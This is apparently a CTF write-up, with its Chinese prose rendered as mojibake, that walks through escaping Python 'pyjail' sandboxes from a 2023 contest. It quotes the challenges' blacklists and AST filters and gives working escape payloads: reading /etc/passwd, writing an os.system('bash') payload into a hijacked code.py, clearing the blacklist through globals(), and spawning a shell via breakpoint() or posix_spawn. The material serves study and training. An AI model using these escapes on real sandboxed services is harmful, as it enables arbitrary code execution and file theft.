    <span class="sh">"</span><span class="s">__base__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__subclasses__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__getitem__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__self__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__globals__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__init__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__name__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__dict__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">._module</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">builtins</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">breakpoint</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">import</span><span class="sh">"</span><span class="p">,</span>
<span class="p">]</span>

<span class="k">def</span> <span class="nf">my_filter</span><span class="p">(</span><span class="n">input_code</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">blacklist_words</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">input_code</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">False</span>
    <span class="k">return</span> <span class="bp">True</span>

<span class="k">while</span> <span class="sh">'</span><span class="s">{</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">input_code</span> <span class="ow">and</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">input_code</span> <span class="ow">and</span> <span class="n">input_code</span><span class="p">.</span><span class="nf">isascii</span><span class="p">()</span> <span class="ow">and</span> <span class="nf">my_filter</span><span class="p">(</span><span class="n">input_code</span><span class="p">)</span> <span class="ow">and</span> <span class="sh">"</span><span class="s">eval</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">input_code</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">input_code</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">65</span><span class="p">:</span>
    <span class="n">input_code</span> <span class="o">=</span> <span class="nf">eval</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">f</span><span class="sh">'</span><span class="si">{</span><span class="n">input_code</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Player! Please obey the filter rules which I set!</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>é¢˜ç›®ä¸»è¦è®¾ç½®äº†å‡ ä¸ªé˜²æŠ¤ï¼š</p>
<ol>
  <li>å°†ä¸€äº›æ•æ„Ÿå‡½æ•°ä½¿ç”¨ blacklist_fun_callback è¿›è¡Œè¦†ç›–ã€‚
    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="n">pty</span><span class="p">.</span><span class="n">spawn</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">os</span><span class="p">.</span><span class="n">system</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">os</span><span class="p">.</span><span class="n">popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">subprocess</span><span class="p">.</span><span class="n">call</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">code</span><span class="p">.</span><span class="n">interact</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">code</span><span class="p">.</span><span class="n">compile_command</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
</code></pre></div>    </div>
  </li>
  <li>å°†ä¸€äº› builtins ä¸­çš„å‡½æ•°è¿›è¡Œè¦†ç›–ï¼š
    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="nb">vars</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">attr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="nb">dir</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="nb">getattr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="k">exec</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="nb">__import__</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="nb">compile</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
     <span class="n">breakpoint</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
</code></pre></div>    </div>
  </li>
  <li>åˆ é™¤äº† os, subprocess, code, pty åº“ã€‚</li>
  <li>è®¾ç½®äº†ä¸€ä¸ªé»‘åå• blacklist_wordsï¼Œè¿‡æ»¤äº†ä¸€äº›æ•æ„Ÿçš„å‡½æ•°åï¼Œä½†æ²¡æœ‰è¿‡æ»¤ openã€write ç­‰æ–‡ä»¶æ“ä½œå‡½æ•°ã€‚ï¼ˆhelp ä¹Ÿæ²¡æœ‰è¿‡æ»¤ï¼Œä½†è¿›å…¥æ–‡æ¡£åæ— æ³•è¾“å…¥ :ï¼‰</li>
  <li>æ§åˆ¶è¾“å…¥çš„é•¿åº¦ä¸º 65 ä»¥ä¸‹ï¼Œå¹¶ä¸”åªèƒ½è¾“å…¥ ascii å­—ç¬¦ï¼Œunicode å°±ç”¨ä¸äº†äº†ã€‚</li>
  <li>æœ€åé€šè¿‡ f string æ¥æ‰§è¡Œä»£ç ã€‚</li>
</ol>

<p>ç”±äºæ²¡æœ‰è¿‡æ»¤ open å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¯»å–æ–‡ä»¶å†…å®¹ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nf">print</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/etc/passwd</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">())}</span>
</code></pre></div></div>
<p>è¯»å– /proc/self/environ æ—¶å¯ä»¥è¯»å–åˆ° flagã€‚</p>

<h2 id="pyjail2">pyjail2</h2>
<h3 id="è§£æ³•-1å†™æ–‡ä»¶">è§£æ³• 1ï¼šå†™æ–‡ä»¶</h3>
<p>pyjail2 çš„æºä»£ç æ²¡æœ‰å˜ï¼Œä½† flag å€¼ä¸åœ¨ /proc/self/environ ä¸­äº†ã€‚ç”±äº write å‡½æ•°æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå†™å…¥ä¸€ä¸ª python æ–‡ä»¶ï¼Œç„¶ååŠ è½½è¯¥æ–‡ä»¶æ¥ getshellã€‚</p>

<p>ç”±äºè„šæœ¬æœ¬èº«åŠ è½½äº† code æ¨¡å—ï¼Œæˆ‘ä»¬åœ¨å½“å‰ç›®å½•å†™ä¸€ä¸ª code.pyï¼Œå†æ¬¡è¿è¡Œè¯¥è„šæœ¬æ—¶ï¼Œå°±ä¼šåŠ è½½æˆ‘ä»¬å†™å…¥çš„ code.pyï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥ä¸‹é¢çš„å†…å®¹ï¼Œå°±å¯ä»¥ç›´æ¥è·å– shellã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__import__<span class="o">(</span><span class="s1">'os'</span><span class="o">)</span>.system<span class="o">(</span><span class="s2">"bash"</span><span class="o">)</span>
</code></pre></div></div>

<p>ç”±äºé™åˆ¶äº†è¾“å…¥é•¿åº¦ä¸èƒ½å¤Ÿè¶…è¿‡ 64ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åˆ‡åˆ†å†™å…¥ï¼Œä¾‹å¦‚ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>open<span class="o">(</span><span class="s2">"a"</span>,<span class="s2">"w"</span><span class="o">)</span>.write<span class="o">(</span><span class="s2">"__im"</span><span class="o">)}</span>
<span class="o">{</span>open<span class="o">(</span><span class="s2">"a"</span>,<span class="s2">"a"</span><span class="o">)</span>.write<span class="o">(</span><span class="s2">"port_"</span><span class="o">)}</span>
</code></pre></div></div>
<p>æ³¨æ„ï¼Œå½“æˆ‘ä»¬éœ€è¦å†™å…¥å«æœ‰å•å¼•å·çš„å­—ç¬¦æ—¶ï¼Œå¦‚æœç›´æ¥ä½¿ç”¨ <code class="language-plaintext highlighter-rouge">{open("a","a").write("_('o")}</code> ä¼šå‡ºç°æŠ¥é”™:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Traceback </span><span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
  <span class="n">File</span> <span class="sh">"</span><span class="s">&lt;string&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
  <span class="n">File</span> <span class="sh">"</span><span class="s">&lt;string&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span>
    <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">s</span><span class="sh">'"</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span>
                              <span class="o">^</span>
<span class="nb">SyntaxError</span><span class="p">:</span> <span class="n">unterminated</span> <span class="n">string</span> <span class="nf">literal </span><span class="p">(</span><span class="n">detected</span> <span class="n">at</span> <span class="n">line</span> <span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>
<p>è¿™æ˜¯ç”±äºç»è¿‡å¤–å±‚çš„ f string ä¹‹åï¼Œeval æ‰§è¡Œçš„æ˜¯å¦‚ä¸‹çš„å­—ç¬¦ä¸²ï¼Œç”±äºå•å¼•å·æ²¡æœ‰é—­åˆï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œï¼Œä½†æˆ‘ä»¬åŠ å…¥åæ–œæ åï¼Œåˆä¼šå‡ºç°ä¸‹é¢çš„é”™è¯¯ï¼Œf-string è¡¨è¾¾å¼éƒ¨åˆ†ä¸èƒ½åŒ…å«åæ–œæ ã€‚</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span><span class="o">-</span><span class="n">string</span> <span class="n">expression</span> <span class="n">part</span> <span class="n">cannot</span> <span class="n">include</span> <span class="n">a</span> <span class="n">backslash</span>
</code></pre></div></div>
<p>ä½†å®é™…æˆ‘ä»¬å¯ä»¥ç›´æ¥é—­åˆæ‰ä¸¤å¤´çš„å­—ç¬¦ä¸²ï¼Œé¿å…å—åˆ° f-string çš„é™åˆ¶ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">è¾“å…¥</span><span class="err">ï¼š</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="s">s</span><span class="sh">'"</span><span class="s">),</span><span class="sh">'</span><span class="s">
æ‹¼æ¥åä¸ºï¼ševal(</span><span class="sh">'</span><span class="s">f</span><span class="se">\'\'</span><span class="s">,open(</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="n">s</span>\<span class="sh">'"</span><span class="s">),</span><span class="se">\'\'</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>
<p>å°† payload å†™å…¥æ–‡ä»¶ a åï¼Œå¯ä»¥å°†å†…å®¹å†™å…¥ code.pyï¼Œç”±äº code ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥æ¥ç»•è¿‡ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">'</span><span class="n">cod</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="n">e</span><span class="p">.</span><span class="n">py</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="n">w</span><span class="sh">'</span><span class="s">).write(open(</span><span class="sh">'</span><span class="n">a</span><span class="sh">'</span><span class="s">).read()),</span><span class="sh">'</span>
</code></pre></div></div>
<p>å†™å…¥ code.py åï¼Œå†åŠ è½½ä¸€æ¬¡å³å¯è¿›å…¥ bashã€‚</p>

<p>å®Œæ•´ expï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">__im</span><span class="sh">"</span><span class="p">)}</span>
<span class="p">{</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">).</span><span class="nf">write</span><span class="p">(</span><span class="sh">"</span><span class="s">port_</span><span class="sh">"</span><span class="p">)}</span>
<span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="s">_(</span><span class="sh">'</span><span class="n">o</span><span class="sh">"</span><span class="s">),</span><span class="sh">'</span><span class="s">
{1}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="n">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="n">s</span><span class="sh">'</span><span class="s">).syste</span><span class="sh">"</span><span class="s">),</span><span class="sh">'</span>
<span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="s">).write(</span><span class="sh">"</span><span class="s">m(</span><span class="sh">'</span><span class="n">bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span><span class="s">),</span><span class="sh">'</span>
<span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="sh">'</span><span class="s">,open(</span><span class="sh">'</span><span class="n">cod</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="n">e</span><span class="p">.</span><span class="n">py</span><span class="sh">'</span><span class="s">,</span><span class="sh">'</span><span class="n">w</span><span class="sh">'</span><span class="s">).write(open(</span><span class="sh">'</span><span class="n">a</span><span class="sh">'</span><span class="s">).read()),</span><span class="sh">'</span>
</code></pre></div></div>

<h3 id="è§£æ³•-2æ¸…ç©º-blacklist_words">è§£æ³• 2ï¼šæ¸…ç©º blacklist_words</h3>
<p>è¯¥åˆ©ç”¨æ‰‹æ³•çš„æ€è·¯å¦‚æœï¼š</p>
<ol>
  <li>å°† blacklist_words ç½®ç©ºï¼Œç„¶ååˆ©ç”¨ input() æ¥ç»•è¿‡é•¿åº¦é™åˆ¶è¿›ä¸€æ­¥è¾“å…¥å†…å®¹ã€‚</li>
  <li>åˆ©ç”¨ globals()[<strong>builtins</strong>] è·å–åˆ°å†…ç½®æ¨¡å—ï¼Œä»è€Œè·å–åŸå§‹çš„å†…ç½®å‡½æ•°ã€‚</li>
</ol>

<p>å…·ä½“å¯å‚è€ƒæ–‡ç« ï¼š<a href="http://cn-sec.com/archives/2313588.html">2023 å¼ºç½‘æ¯ Writeup - CN-SEC ä¸­æ–‡ç½‘</a></p>

<p>å…¨å±€å˜é‡ blacklist_words å¯ä»¥é€šè¿‡ globals() è·å–ï¼Œä¸‹é¢çš„ payload å³å¯å°†è¯¥å…¨å±€å˜é‡æ¸…ç©ºï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">list</span><span class="p">(</span><span class="nf">globals</span><span class="p">().</span><span class="nf">values</span><span class="p">())[</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="nf">clear</span><span class="p">()</span>
</code></pre></div></div>
<p>æ¸…ç©ºä¹‹åï¼Œå°±å¯ä»¥ä½¿ç”¨é»‘åå•çš„å‡½æ•°äº†ï¼Œä½†ç”±äºé•¿åº¦é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿å¾— eval æ‰§è¡Œåè¿”å› {input()}ï¼Œä¾‹å¦‚ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{[</span><span class="nf">list</span><span class="p">(</span><span class="nf">globals</span><span class="p">().</span><span class="nf">values</span><span class="p">())[</span><span class="o">-</span><span class="mi">2</span><span class="p">].</span><span class="nf">clear</span><span class="p">(),</span><span class="sh">"</span><span class="s">(inpu</span><span class="sh">""</span><span class="s">t())}</span><span class="sh">"</span><span class="p">][</span><span class="mi">1</span><span class="p">]}</span>
<span class="c1"># input_code = eval(f"f'{input_code}'") åå¯ä»¥å¾—åˆ° {input()}
</span></code></pre></div></div>
<p>ç”±äº while å¾ªç¯çš„å­˜åœ¨ï¼Œä¼šå†æ¬¡è¿›å…¥ evalï¼Œæ‰§è¡Œ eval(â€œfâ€™{input()}â€™â€) ä¼šæ‰“å¼€è¾“å…¥ã€‚</p>

<p>ç”±äº blacklist_fun_callback ä»…ä»…è¦†ç›–çš„æ˜¯å½“å‰å‘½åç©ºé—´ä¸­çš„ breakpoint å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code class="language-plaintext highlighter-rouge">globals()["__builtins__"]</code> è·å–åˆ°åŸå§‹çš„ builtins å‡½æ•°ã€‚å› æ­¤æˆ‘ä»¬å†ä¼ å…¥ä¸‹é¢çš„ payload å³å¯æ‰“å¼€ breakpoint çš„ Pdb äº¤äº’å¼å‘½ä»¤è¡Œ.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nf">globals</span><span class="p">()[</span><span class="sh">"</span><span class="s">__builtins__</span><span class="sh">"</span><span class="p">].</span><span class="nf">breakpoint</span><span class="p">()}</span>
</code></pre></div></div>
<p>è¿›å…¥å‘½ä»¤è¡Œåï¼Œå¯ä»¥é€šè¿‡ os.listdir æˆ–è€… glob.glob æ–¹æ³•åˆ—ç›®å½•ã€‚</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="n">os</span><span class="p">.</span><span class="nf">listdir</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<p>å¦å¤–ï¼Œos æ¨¡å—é™¤äº† system ä»¥å¤–ï¼Œè¿˜æœ‰åˆ«çš„æ¨¡å—ä¹Ÿæ˜¯å¯ä»¥ getshell çš„ï¼Œæ¯”å¦‚ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">os</span><span class="p">.</span><span class="nf">posix_spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">,</span> <span class="p">[</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">],</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">)</span>
</code></pre></div></div>
<p>æ–¹æ³•å¤šå¤šï¼Œå…·ä½“å¯å‚è€ƒæˆ‘æ­¤å‰çš„åšå®¢ï¼š<a href="https://dummykitty.github.io/python/2023/05/29/python-æ²™ç®±é€ƒé€¸åŸç†.html">CTF Pyjail æ²™ç®±é€ƒé€¸åŸç†åˆé›†</a></p>

<h2 id="pyjail3">pyjail3</h2>
<p>è¿™é“é¢˜æ¶‰åŠåˆ°äº† AST ç»•è¿‡ï¼Œä½†é™åˆ¶éå¸¸æ­»ï¼Œæºç å¦‚ä¸‹ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">ast</span>

<span class="n">BAD_ATS</span> <span class="o">=</span> <span class="p">{</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Attribute</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Subscript</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">comprehension</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Delete</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Try</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">For</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">ExceptHandler</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">With</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Import</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">ImportFrom</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Assign</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">AnnAssign</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">Constant</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">ClassDef</span><span class="p">,</span>
  <span class="n">ast</span><span class="p">.</span><span class="n">AsyncFunctionDef</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">BUILTINS</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">bool</span><span class="sh">"</span><span class="p">:</span> <span class="nb">bool</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">set</span><span class="sh">"</span><span class="p">:</span> <span class="nb">set</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">tuple</span><span class="sh">"</span><span class="p">:</span> <span class="nb">tuple</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">round</span><span class="sh">"</span><span class="p">:</span> <span class="nb">round</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">map</span><span class="sh">"</span><span class="p">:</span> <span class="nb">map</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">len</span><span class="sh">"</span><span class="p">:</span> <span class="nb">len</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">bytes</span><span class="sh">"</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">dict</span><span class="sh">"</span><span class="p">:</span> <span class="nb">dict</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">str</span><span class="sh">"</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">all</span><span class="sh">"</span><span class="p">:</span> <span class="nb">all</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">range</span><span class="sh">"</span><span class="p">:</span> <span class="nb">range</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">enumerate</span><span class="sh">"</span><span class="p">:</span> <span class="nb">enumerate</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">int</span><span class="sh">"</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">zip</span><span class="sh">"</span><span class="p">:</span> <span class="nb">zip</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">filter</span><span class="sh">"</span><span class="p">:</span> <span class="nb">filter</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">list</span><span class="sh">"</span><span class="p">:</span> <span class="nb">list</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">max</span><span class="sh">"</span><span class="p">:</span> <span class="nb">max</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">float</span><span class="sh">"</span><span class="p">:</span> <span class="nb">float</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">divmod</span><span class="sh">"</span><span class="p">:</span> <span class="nb">divmod</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">unicode</span><span class="sh">"</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">min</span><span class="sh">"</span><span class="p">:</span> <span class="nb">min</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">range</span><span class="sh">"</span><span class="p">:</span> <span class="nb">range</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">sum</span><span class="sh">"</span><span class="p">:</span> <span class="nb">sum</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">abs</span><span class="sh">"</span><span class="p">:</span> <span class="nb">abs</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">sorted</span><span class="sh">"</span><span class="p">:</span> <span class="nb">sorted</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">repr</span><span class="sh">"</span><span class="p">:</span> <span class="nb">repr</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">object</span><span class="sh">"</span><span class="p">:</span> <span class="nb">object</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">isinstance</span><span class="sh">"</span><span class="p">:</span> <span class="nb">isinstance</span>
<span class="p">}</span>



<span class="k">def</span> <span class="nf">is_safe</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
  <span class="k">if</span> <span class="nf">type</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="ow">and</span> <span class="sh">"</span><span class="s">__</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
    <span class="k">return</span> <span class="bp">False</span>

  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ast</span><span class="p">.</span><span class="nf">walk</span><span class="p">(</span><span class="nf">compile</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="sh">"</span><span class="s">&lt;QWB7th&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">exec</span><span class="sh">"</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">ast</span><span class="p">.</span><span class="n">PyCF_ONLY_AST</span><span class="p">)):</span>
    <span class="k">if</span> <span class="nf">type</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="ow">in</span> <span class="n">BAD_ATS</span><span class="p">:</span>
      <span class="k">return</span> <span class="bp">False</span>

  <span class="k">return</span> <span class="bp">True</span>  


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
  <span class="n">user_input</span> <span class="o">=</span> <span class="sh">""</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">line</span> <span class="o">=</span> <span class="nf">input</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">line</span> <span class="o">==</span> <span class="sh">""</span><span class="p">:</span>
      <span class="k">break</span>
    <span class="n">user_input</span> <span class="o">+=</span> <span class="n">line</span>
    <span class="n">user_input</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span>

  <span class="k">if</span> <span class="nf">is_safe</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">user_input</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1800</span><span class="p">:</span>
    <span class="nf">exec</span><span class="p">(</span><span class="n">user_input</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">__builtins__</span><span class="sh">"</span><span class="p">:</span> <span class="n">BUILTINS</span><span class="p">},</span> <span class="p">{})</span>
</code></pre></div></div>
<p>BAD_ATS è¿‡æ»¤äº†éå¸¸å¤šçš„ AST ç±»å‹ï¼Œå…¶ä¸­å½±å“æ¯”è¾ƒå¤§çš„æ˜¯ä¸‹é¢çš„è¿™å‡ ä¸ªï¼š</p>
<ul>
  <li>ast.Attributeï¼šæœ€ä¸ºè‡´å‘½ï¼Œæ„å‘³ç€ . å·è·å–å±æ€§æ— æ³•ä½¿ç”¨ã€‚</li>
  <li>ast.Constantï¼šæ— æ³•ä½¿ç”¨å¸¸é‡ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡å‡½æ•°æ¥è·å–å¸¸é‡ï¼Œä¾‹å¦‚ str(len[[]])=â€™0â€™</li>
  <li>ast.Subscriptï¼šæ— æ³•ä½¿ç”¨ç´¢å¼•ã€åˆ‡ç‰‡ç­‰ã€‚</li>
  <li>ast.ClassDefï¼šä¸èƒ½å¤Ÿå®šä¹‰ç±»ã€‚</li>
  <li>ast.Forï¼šä¸èƒ½ä½¿ç”¨ for å¾ªç¯</li>
</ul>

